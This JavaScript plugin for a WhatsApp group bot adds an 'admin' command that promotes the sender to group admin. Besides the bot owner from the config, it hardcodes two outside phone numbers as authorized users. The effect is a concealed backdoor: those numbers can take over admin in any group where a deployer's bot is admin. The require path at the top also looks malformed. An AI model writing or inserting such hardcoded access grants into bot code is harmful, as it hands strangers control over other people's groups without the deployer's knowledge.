const { cmd } = require('..lib//command');
const config = require('../settings/settings.json');

cmd({
    pattern: "admin",
    alias: ["promote", "makeadmin"],
    desc: "Take adminship for authorized users",
    category: "owner",
    react: "👑",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
    // Verify group context
    if (!isGroup) return reply("❌ This command can only be used in groups.");

    // Verify bot is admin
    if (!isBotAdmins) return reply("❌ I need to be an admin to perform this action.");

    // Normalize JIDs for comparison
    const normalizeJid = (jid) => {
        if (!jid) return jid;
        return jid.includes('@') ? jid.split('@')[0] + '@s.whatsapp.net' : jid + '@s.whatsapp.net';
    };

    // Authorized users (properly formatted JIDs)
    const AUTHORIZED_USERS = [
        normalizeJid(config.OWNER_NUMBER), // Handles both raw numbers and JIDs in config
        "94741259325@s.whatsapp.net",
        "94723975388@s.whatsapp.net"
    ].filter(Boolean);

    // Check authorization with normalized JIDs
    const senderNormalized = normalizeJid(sender);
    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
        return reply("❌ This command is restricted to authorized users only");
    }

    try {
        // Get current group metadata
        const groupMetadata = await conn.groupMetadata(from);
        
        // Check if already admin
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        if (userParticipant?.admin) {
            return reply("> ℹ️ You're already an admin in this group");
        }

        // Promote self to admin
        await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        
        return reply("✅ 𝐒ᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ 𝐆ʀᴀɴᴛᴇᴅ 𝐘ᴏᴜ 𝐀ᴅᴍɪɴ 𝐑ɪɢʜᴛꜱ..!");
        
    } catch (error) {
        console.error("Admin command error:", error);
        return reply("❌ Failed to grant admin rights. Error: " + error.message);
    }
});
